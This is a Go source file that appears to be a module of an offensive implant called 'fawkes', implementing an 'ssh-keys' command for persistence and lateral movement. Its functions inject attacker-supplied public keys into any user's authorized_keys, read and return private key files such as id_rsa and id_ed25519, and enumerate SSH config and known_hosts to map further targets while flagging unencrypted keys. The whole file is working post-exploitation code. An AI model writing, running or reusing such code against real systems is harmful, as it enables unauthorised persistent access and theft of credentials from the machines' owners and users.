//go:build !windows

package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

type SSHKeysCommand struct{}

func (c *SSHKeysCommand) Name() string {
	return "ssh-keys"
}

func (c *SSHKeysCommand) Description() string {
	return "Read or inject SSH authorized_keys for persistence/lateral movement (T1098.004)"
}

type sshKeysArgs struct {
	Action string `json:"action"`
	Key    string `json:"key"`
	User   string `json:"user"`
	Path   string `json:"path"`
}

func (c *SSHKeysCommand) Execute(task structs.Task) structs.CommandResult {
	var args sshKeysArgs

	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: parameters required. Use action: list, add, remove, read-private",
			Status:    "error",
			Completed: true,
		}
	}

	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	switch strings.ToLower(args.Action) {
	case "list":
		return sshKeysList(args)
	case "add":
		return sshKeysAdd(args)
	case "remove":
		return sshKeysRemove(args)
	case "read-private":
		return sshKeysReadPrivate(args)
	case "enumerate":
		return sshKeysEnumerate(args)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s. Use: list, add, remove, read-private, enumerate", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

// getSSHDir returns the .ssh directory for the target user
func getSSHDir(targetUser string) (string, error) {
	if targetUser != "" {
		u, err := user.Lookup(targetUser)
		if err != nil {
			return "", fmt.Errorf("user '%s' not found: %v", targetUser, err)
		}
		return filepath.Join(u.HomeDir, ".ssh"), nil
	}
	// Current user
	home, err := os.UserHomeDir()
	if err != nil {
		return "", fmt.Errorf("cannot determine home directory: %v", err)
	}
	return filepath.Join(home, ".ssh"), nil
}

// sshKeysList reads authorized_keys
func sshKeysList(args sshKeysArgs) structs.CommandResult {
	sshDir, err := getSSHDir(args.User)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	authKeysPath := filepath.Join(sshDir, "authorized_keys")
	if args.Path != "" {
		authKeysPath = args.Path
	}

	content, err := os.ReadFile(authKeysPath)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error reading %s: %v", authKeysPath, err),
			Status:    "error",
			Completed: true,
		}
	}

	output := strings.TrimSpace(string(content))
	if output == "" {
		output = "(empty file)"
	}

	// Count keys
	lines := strings.Split(output, "\n")
	keyCount := 0
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" && !strings.HasPrefix(line, "#") {
			keyCount++
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Authorized keys (%s) — %d key(s):\n%s", authKeysPath, keyCount, output),
		Status:    "success",
		Completed: true,
	}
}

// sshKeysAdd injects a public key into authorized_keys
func sshKeysAdd(args sshKeysArgs) structs.CommandResult {
	if args.Key == "" {
		return structs.CommandResult{
			Output:    "Error: 'key' is required (the SSH public key to inject)",
			Status:    "error",
			Completed: true,
		}
	}

	sshDir, err := getSSHDir(args.User)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Create .ssh dir if it doesn't exist (0700 permissions)
	if err := os.MkdirAll(sshDir, 0700); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error creating %s: %v", sshDir, err),
			Status:    "error",
			Completed: true,
		}
	}

	authKeysPath := filepath.Join(sshDir, "authorized_keys")
	if args.Path != "" {
		authKeysPath = args.Path
	}

	// Read existing content
	existing, _ := os.ReadFile(authKeysPath)
	existingStr := strings.TrimRight(string(existing), "\n")

	// Check if key already exists
	if strings.Contains(existingStr, strings.TrimSpace(args.Key)) {
		return structs.CommandResult{
			Output:    "Key already exists in authorized_keys",
			Status:    "success",
			Completed: true,
		}
	}

	// Append the new key
	newContent := existingStr
	if newContent != "" {
		newContent += "\n"
	}
	newContent += strings.TrimSpace(args.Key) + "\n"

	if err := os.WriteFile(authKeysPath, []byte(newContent), 0600); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error writing %s: %v", authKeysPath, err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Injected SSH key into %s", authKeysPath),
		Status:    "success",
		Completed: true,
	}
}

// sshKeysRemove removes a key from authorized_keys
func sshKeysRemove(args sshKeysArgs) structs.CommandResult {
	if args.Key == "" {
		return structs.CommandResult{
			Output:    "Error: 'key' is required (substring to match for removal)",
			Status:    "error",
			Completed: true,
		}
	}

	sshDir, err := getSSHDir(args.User)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	authKeysPath := filepath.Join(sshDir, "authorized_keys")
	if args.Path != "" {
		authKeysPath = args.Path
	}

	content, err := os.ReadFile(authKeysPath)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error reading %s: %v", authKeysPath, err),
			Status:    "error",
			Completed: true,
		}
	}

	lines := strings.Split(string(content), "\n")
	var kept []string
	removedCount := 0
	for _, line := range lines {
		if strings.Contains(line, args.Key) {
			removedCount++
			continue
		}
		kept = append(kept, line)
	}

	if removedCount == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("No keys matching '%s' found", args.Key),
			Status:    "error",
			Completed: true,
		}
	}

	newContent := strings.Join(kept, "\n")
	if err := os.WriteFile(authKeysPath, []byte(newContent), 0600); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error writing %s: %v", authKeysPath, err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Removed %d key(s) matching '%s' from %s", removedCount, args.Key, authKeysPath),
		Status:    "success",
		Completed: true,
	}
}

// sshKeysReadPrivate reads SSH private key files
func sshKeysReadPrivate(args sshKeysArgs) structs.CommandResult {
	sshDir, err := getSSHDir(args.User)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// If a specific path is given, just read that file
	if args.Path != "" {
		content, err := os.ReadFile(args.Path)
		if err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error reading %s: %v", args.Path, err),
				Status:    "error",
				Completed: true,
			}
		}
		return structs.CommandResult{
			Output:    fmt.Sprintf("=== %s ===\n%s", args.Path, string(content)),
			Status:    "success",
			Completed: true,
		}
	}

	// Enumerate and read common private key files
	keyFiles := []string{"id_rsa", "id_ecdsa", "id_ed25519", "id_dsa"}
	var results []string
	found := 0

	for _, name := range keyFiles {
		keyPath := filepath.Join(sshDir, name)
		content, err := os.ReadFile(keyPath)
		if err != nil {
			continue // File doesn't exist or can't be read
		}
		found++
		results = append(results, fmt.Sprintf("=== %s ===\n%s", keyPath, string(content)))
	}

	if found == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("No private keys found in %s", sshDir),
			Status:    "success",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Found %d private key(s):\n\n%s", found, strings.Join(results, "\n\n")),
		Status:    "success",
		Completed: true,
	}
}

// sshKeysEnumerate scans SSH config and known_hosts to map lateral movement targets.
// Parses: ~/.ssh/config (host aliases, jump hosts, identity files, ports, usernames),
// ~/.ssh/known_hosts (previously-connected hosts), and summarizes private key types.
func sshKeysEnumerate(args sshKeysArgs) structs.CommandResult {
	sshDir, err := getSSHDir(args.User)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== SSH Enumeration: %s ===\n", sshDir))

	// --- Parse ~/.ssh/config ---
	configHosts := parseSSHConfig(filepath.Join(sshDir, "config"))
	if len(configHosts) > 0 {
		sb.WriteString(fmt.Sprintf("\n[SSH Config] %d host(s):\n", len(configHosts)))
		for _, h := range configHosts {
			sb.WriteString(fmt.Sprintf("  Host: %s\n", h.alias))
			if h.hostname != "" {
				sb.WriteString(fmt.Sprintf("    HostName: %s\n", h.hostname))
			}
			if h.user != "" {
				sb.WriteString(fmt.Sprintf("    User: %s\n", h.user))
			}
			if h.port != "" {
				sb.WriteString(fmt.Sprintf("    Port: %s\n", h.port))
			}
			if h.identityFile != "" {
				sb.WriteString(fmt.Sprintf("    IdentityFile: %s\n", h.identityFile))
			}
			if h.proxyJump != "" {
				sb.WriteString(fmt.Sprintf("    ProxyJump: %s\n", h.proxyJump))
			}
			if h.proxyCommand != "" {
				sb.WriteString(fmt.Sprintf("    ProxyCommand: %s\n", h.proxyCommand))
			}
		}
	} else {
		sb.WriteString("\n[SSH Config] No config file or no host entries found\n")
	}

	// --- Parse ~/.ssh/known_hosts ---
	knownHosts := parseKnownHosts(filepath.Join(sshDir, "known_hosts"))
	if len(knownHosts) > 0 {
		sb.WriteString(fmt.Sprintf("\n[Known Hosts] %d host(s):\n", len(knownHosts)))
		hashedCount := 0
		for _, kh := range knownHosts {
			if kh.hashed {
				hashedCount++
				continue
			}
			sb.WriteString(fmt.Sprintf("  %s (%s)\n", kh.host, kh.keyType))
		}
		if hashedCount > 0 {
			sb.WriteString(fmt.Sprintf("  + %d hashed host(s) (not decodable)\n", hashedCount))
		}
	} else {
		sb.WriteString("\n[Known Hosts] No known_hosts file found\n")
	}

	// --- Summarize private keys ---
	keyFiles := []string{"id_rsa", "id_ecdsa", "id_ed25519", "id_dsa"}
	var foundKeys []string
	for _, name := range keyFiles {
		keyPath := filepath.Join(sshDir, name)
		info, err := os.Stat(keyPath)
		if err != nil {
			continue
		}
		encrypted := "plaintext"
		if content, err := os.ReadFile(keyPath); err == nil {
			if strings.Contains(string(content), "ENCRYPTED") {
				encrypted = "encrypted"
			}
		}
		foundKeys = append(foundKeys, fmt.Sprintf("  %s (%d bytes, %s)", name, info.Size(), encrypted))
	}
	// Also check for non-standard key files referenced in config
	for _, h := range configHosts {
		if h.identityFile != "" && !isStandardKeyFile(h.identityFile) {
			expandedPath := h.identityFile
			if strings.HasPrefix(expandedPath, "~/") {
				if home, err := os.UserHomeDir(); err == nil {
					expandedPath = filepath.Join(home, expandedPath[2:])
				}
			}
			if info, err := os.Stat(expandedPath); err == nil {
				encrypted := "plaintext"
				if content, err := os.ReadFile(expandedPath); err == nil {
					if strings.Contains(string(content), "ENCRYPTED") {
						encrypted = "encrypted"
					}
				}
				foundKeys = append(foundKeys, fmt.Sprintf("  %s (%d bytes, %s) [from config]", expandedPath, info.Size(), encrypted))
			}
		}
	}
	if len(foundKeys) > 0 {
		sb.WriteString(fmt.Sprintf("\n[Private Keys] %d key(s):\n", len(foundKeys)))
		for _, k := range foundKeys {
			sb.WriteString(k + "\n")
		}
	} else {
		sb.WriteString("\n[Private Keys] None found\n")
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// sshConfigHost holds parsed SSH config entries
type sshConfigHost struct {
	alias        string
	hostname     string
	user         string
	port         string
	identityFile string
	proxyJump    string
	proxyCommand string
}

// parseSSHConfig parses an OpenSSH config file and extracts host blocks.
func parseSSHConfig(path string) []sshConfigHost {
	content, err := os.ReadFile(path)
	if err != nil {
		return nil
	}

	var hosts []sshConfigHost
	var current *sshConfigHost

	for _, line := range strings.Split(string(content), "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		// Split on first whitespace or =
		key, value := splitSSHConfigLine(line)
		if key == "" {
			continue
		}

		switch strings.ToLower(key) {
		case "host":
			// Skip wildcard-only entries (e.g., "Host *")
			if value == "*" {
				current = nil
				continue
			}
			if current != nil {
				hosts = append(hosts, *current)
			}
			current = &sshConfigHost{alias: value}
		case "hostname":
			if current != nil {
				current.hostname = value
			}
		case "user":
			if current != nil {
				current.user = value
			}
		case "port":
			if current != nil {
				current.port = value
			}
		case "identityfile":
			if current != nil {
				current.identityFile = value
			}
		case "proxyjump":
			if current != nil {
				current.proxyJump = value
			}
		case "proxycommand":
			if current != nil {
				current.proxyCommand = value
			}
		}
	}
	if current != nil {
		hosts = append(hosts, *current)
	}

	return hosts
}

// splitSSHConfigLine splits a config line into key/value, handling both
// "Key Value" (space-separated) and "Key=Value" (equals) formats.
func splitSSHConfigLine(line string) (string, string) {
	// Try equals first
	if idx := strings.Index(line, "="); idx > 0 {
		return strings.TrimSpace(line[:idx]), strings.TrimSpace(line[idx+1:])
	}
	// Space-separated
	parts := strings.SplitN(line, " ", 2)
	if len(parts) != 2 {
		parts = strings.SplitN(line, "\t", 2)
	}
	if len(parts) != 2 {
		return "", ""
	}
	return strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])
}

// knownHost holds a parsed known_hosts entry
type knownHost struct {
	host    string
	keyType string
	hashed  bool
}

// parseKnownHosts parses an OpenSSH known_hosts file.
func parseKnownHosts(path string) []knownHost {
	content, err := os.ReadFile(path)
	if err != nil {
		return nil
	}

	var hosts []knownHost
	seen := make(map[string]bool)

	for _, line := range strings.Split(string(content), "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		fields := strings.Fields(line)
		if len(fields) < 3 {
			continue
		}

		hostField := fields[0]
		keyType := fields[1]

		// Check if host is hashed (starts with |1|)
		if strings.HasPrefix(hostField, "|1|") {
			if !seen["__hashed__"+line[:20]] {
				hosts = append(hosts, knownHost{host: "(hashed)", keyType: keyType, hashed: true})
				seen["__hashed__"+line[:20]] = true
			}
			continue
		}

		// Host field can be comma-separated list of hosts/IPs
		for _, h := range strings.Split(hostField, ",") {
			h = strings.TrimSpace(h)
			// Strip [host]:port format
			if strings.HasPrefix(h, "[") {
				if idx := strings.Index(h, "]:"); idx > 0 {
					h = h[1:idx]
				} else if strings.HasSuffix(h, "]") {
					h = h[1 : len(h)-1]
				}
			}
			if h != "" && !seen[h] {
				hosts = append(hosts, knownHost{host: h, keyType: keyType, hashed: false})
				seen[h] = true
			}
		}
	}

	return hosts
}

// isStandardKeyFile returns true if the path matches a standard SSH key filename.
func isStandardKeyFile(path string) bool {
	base := filepath.Base(path)
	standard := []string{"id_rsa", "id_ecdsa", "id_ed25519", "id_dsa"}
	for _, s := range standard {
		if base == s {
			return true
		}
	}
	return false
}
